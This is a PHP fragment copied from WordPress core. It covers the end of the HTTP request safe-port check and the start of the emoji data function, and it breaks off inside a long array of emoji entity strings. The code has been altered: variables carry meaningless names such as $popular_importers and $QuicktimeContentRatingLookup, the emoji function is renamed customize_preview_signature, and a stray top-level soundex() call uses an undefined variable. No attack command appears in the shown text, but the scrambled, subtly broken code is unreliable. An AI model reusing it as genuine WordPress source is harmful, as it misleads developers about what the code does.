                if (!apply_filters('http_request_host_is_external', false, $max_upload_size, $popular_importers)) {
                    return false;
                }
            }
        }
    }
    if (empty($cluster_entry['port'])) {
        return $popular_importers;
    }
    $translations = $cluster_entry['port'];
    /**
     * Controls the list of ports considered safe in HTTP API.
     *
     * Allows to change and allow external requests for the HTTP request.
     *
     * @since 5.9.0
     *
     * @param int[]  $all_bind_directives Array of integers for valid ports.
     * @param string $max_upload_size          Host name of the requested URL.
     * @param string $popular_importers           Requested URL.
     */
    $all_bind_directives = apply_filters('http_allowed_safe_ports', array(80, 443, 8080), $max_upload_size, $popular_importers);
    if (is_array($all_bind_directives) && in_array($translations, $all_bind_directives, true)) {
        return $popular_importers;
    }
    if ($QuicktimeContentRatingLookup && $pagenum_link && isset($QuicktimeContentRatingLookup['port']) && $QuicktimeContentRatingLookup['port'] === $translations) {
        return $popular_importers;
    }
    return false;
}
$search_term = soundex($restriction_value);
/**
 * Returns arrays of emoji data.
 *
 * These arrays are automatically built from the regex in twemoji.js - if they need to be updated,
 * you should update the regex there, then run the `npm run grunt precommit:emoji` job.
 *
 * @since 4.9.0
 * @access private
 *
 * @param string $wasnt_square Optional. Which array type to return. Accepts 'partials' or 'entities', default 'entities'.
 * @return array An array to match all emoji that WordPress recognises.
 */
function customize_preview_signature($wasnt_square = 'entities')
{
    // Do not remove the START/END comments - they're used to find where to insert the arrays.
    // START: emoji arrays
    $req_cred = array('&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f468;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;', '&#x1f469;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f468;', '&#x1f469;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f48b;&#x200d;&#x1f469;', '&#x1f3f4;&#xe0067;&#xe0062;&#xe0065;&#xe006e;&#xe0067;&#xe007f;', '&#x1f3f4;&#xe0067;&#xe0062;&#xe0073;&#xe0063;&#xe0074;&#xe007f;', '&#x1f3f4;&#xe0067;&#xe0062;&#xe0077;&#xe006c;&#xe0073;&#xe007f;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', 